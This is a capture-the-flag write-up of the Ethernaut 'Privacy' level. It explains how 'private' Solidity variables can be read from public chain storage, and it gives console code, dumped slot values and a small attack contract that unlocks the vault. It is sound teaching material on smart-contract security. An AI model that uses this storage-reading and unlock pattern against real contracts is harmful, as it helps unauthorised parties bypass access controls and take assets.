+++
title = "Privacy - Ethernaut"
date = "2022-01-26"
author = "DimitrisV"
+++
On this challenge, we have to unlock a vault again, but this is a more advanced one.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

So we can see some state variables and one byte32array. Our constructor parses the valuable data to the private data. The unlock function is our only point of interaction with this contract and here we just need to pass the right sequence of bytes16 to unlock the contract. As we already know, Ethereum blockchain is public, so we can spy on its storage by typing in console:

```
let storage = []
let callbackFNConstructor = (index) => (error, contractData) => {
    storage[index]= contractData
}


for( var i = 0; i<6; i++) { web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i)) }
```
Running the code in the web console above will fetch us the first 6 storage variables defined in the target contract.Then, by accessing in storage array, we can see the 6 storage varaibles:
```
storage
(6) ['0x0000000000000000000000000000000000000000000000000000000000000001', '0x0000000000000000000000000000000000000000000000000000000061e8582a', '0x00000000000000000000000000000000000000000000000000000000582aff0a', '0x6afa09c95f78aa0d4427b26b649a9e39764fb2e42aa80a1628d0af9465f2dfc6', '0x5be1ffbd26ef932af6988e85bfa3168a66be9f53ad7a4036c81ec5578a9e12a6', '0x3cb5971a348f1a4224f2175e48a929cc30b29ff44f5886d651e48fce1acdab53']

```

The very first storage variable ends with "001", so we expect to be a boolean variable. locked is the only boolean variable and obviously it is the first storage array data. We have  the variable flattening = 10; and denomination=255. In hexadecimal, 10 is represented as 0a  and 255 is represented as 255. We can find these in the third storage data.Due to storage optimization from Ethereum, we can find the in the same variable.

Storage optimization follows these very simple rules:
1. Each index set aside for a storage variable allow 256bits.
2. Variables are indexed in the order they are defined in smart-contract.
3. If a variable consumes less than 256bits to be represented, leftover space will be shared with subsequent variables if they fit. Otherwise, they will be in the next storage variable.

Also, it should be mentioned that constants do not use this type of storage. All other storage variables are from the byte32 array ``data`` . Therefore, we can see in unlock function that it is required that the key to be a byte16 and then compares it typecasts the data array[2] as a byte16 to aceed the comparision.
We have just to take the first half of the bytes32 data and that’s going to be the new bytes16 type data. Calling the unlock method with that as an input parameter should unlock the vault. Let's create an attack contract.

```
pragma solidity ^0.6.0;

import './Privacy.sol';

contract PrivacyAttack {
     Privacy target;





     constructor(address _targetAddr) public {
         target = Privacy(_targetAddr);

        
     }

     function unlock(bytes32 _slotValue) public {
	 			// type casting the bytes32 to bytes16 
         bytes16 key = bytes16(_slotValue);
         target.unlock(key);
     }
    }
```

Our contract address is: 
```
contract.address 
```
Under the deployment of the contract, we add the contract's address to set it as a target in the counstructor. Finally, we can copy the storage data that stores the key and then give it as an input to our attack unlock function. Then, the contract will typecast the data from byte32 to byte16, it will keep only the first half of the bytes32 and send it to bytes16 type data. We unlocked the vault!!

---
If you want to learn more about Smart Contract Security, please check our paper and eCourses:
## Smart-Contract Security:

- [Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas](https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf)


* [Smart Contract Security - Educational YouTube Series in Greek - Click Here](https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7)
